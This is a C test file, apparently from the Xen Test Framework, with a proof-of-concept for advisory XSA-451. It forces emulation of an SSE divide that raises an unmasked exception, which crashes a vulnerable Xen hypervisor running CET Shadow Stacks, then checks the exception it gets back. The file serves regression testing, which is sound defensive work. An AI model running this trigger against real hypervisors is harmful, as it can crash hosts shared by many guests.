/**
 * @file tests/xsa-451/main.c
 * @ref test-xsa-451
 *
 * @page test-xsa-451 XSA-451
 *
 * Advisory: [XSA-451](https://xenbits.xen.org/xsa/advisory-451.html)
 *
 * When CET Shadow Stack support was added to Xen, the logic which performs
 * exception recovery from the emulation stubs wasn't adjusted correctly.
 *
 * As a consequence, when an exception is taken in the emulation stubs and Xen
 * is using CET-SS, Xen will crash with a control-flow integrity violation.
 *
 * From a testing point of view, we have no idea if Xen is using CET Shadow
 * Stacks or not.  All we can do is emulate an instruction which will generate
 * an unmasked exception, and hope that we're still alive to report success.
 *
 * @see tests/xsa-451/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-451 PoC";
bool test_needs_fep = true;

void test_main(void)
{
    exinfo_t fault = 0;
    unsigned int status;

    /* Enable SEE, clear and unmask all exceptions. */
    write_cr4(read_cr4() | X86_CR4_OSFXSR | X86_CR4_OSXMMEXCPT);
    write_mxcsr(0);

    /*
     * As we're compiled with -mno-sse, SSE register constraints aren't
     * tolerated.  Just use %xmm0 behind the back of the compiler; it's not
     * going to interfere with anything.
     */
    asm volatile ("xorps %%xmm0, %%xmm0\n\t"
                  _ASM_XEN_FEP "1: divss %%xmm0, %%xmm0\n\t"
                  "2: "
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+a" (fault)
                  : [rec] "p" (ex_record_fault_eax));

    /*
     * If we're still alive here, Xen didn't crash.  Cross-check that the
     * emulator did hand us back the right exception.
     *
     * Note: 0.0 / 0.0 yields #I (Invalid), not #Z (Zero-div).
     */
    if ( fault != EXINFO_SYM(XM, 0) )
        return xtf_error("Error: expecting #XM, got %pe\n", _p(fault));

    status = read_mxcsr() & X86_MXCSR_STATUS_MASK;
    if ( status != X86_MXCSR_IE )
        return xtf_error("Error: expecting #I, got %#x\n", status);

    xtf_success("Success: not vulnerable to XSA-451\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
